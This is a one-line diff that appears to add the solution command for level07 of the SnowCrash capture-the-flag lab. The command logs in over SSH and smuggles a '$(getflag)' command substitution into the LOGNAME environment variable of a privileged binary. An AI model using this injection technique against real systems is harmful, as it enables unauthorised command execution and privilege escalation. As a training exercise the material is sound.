@@ -1,0 +1,1 @@
+ssh level07@$SNOWCRASH_IP -p 4242 'export LOGNAME="\$(getflag)" && ./level07'
